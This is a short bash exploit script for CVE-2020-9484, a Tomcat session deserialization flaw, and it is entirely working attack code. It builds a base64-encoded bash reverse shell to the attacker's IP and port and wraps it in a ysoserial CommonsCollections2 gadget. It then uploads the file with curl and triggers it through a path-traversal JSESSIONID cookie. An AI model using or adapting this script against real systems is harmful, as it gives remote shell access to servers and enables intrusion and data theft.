#!/bin/bash
echo "CVE-2020-9484's exploit for linux by ANSHAJANTH YOGANATHAN"
echo "prerequest website should have file upload function and we must know file store path on server"
read -p "Enter your ip : " ip 
read -p "Enter your port : " port
read -p "Enter your target ip or Uri : " t_ip 
read -p "Enter your target port: " t_port 
read -p "Enter your uploaded file path : " u_path 
shell=$(echo -n "bash -i >& /dev/tcp/$ip/$port 0>&1" | base64)
payload="bash -c {echo,$shell}|{base64,-d}|{bash,-i}"
java -jar /home/kali/Documents/ysoserial.jar  CommonsCollections2 "${payload}" > anjai.session  #before execute the script please check your the ysoserial.jar path
curl -F 'image=@anjai.session' http://$t_ip:$t_port/upload.jsp?email=anjai  #please change this line acording to your target.
curl --cookie "JSESSIONID=../../../../../$u_path/anjai" -L http://$t_ip:$t_port/upload.jsp?email=anjai #please change this line acording to your target.
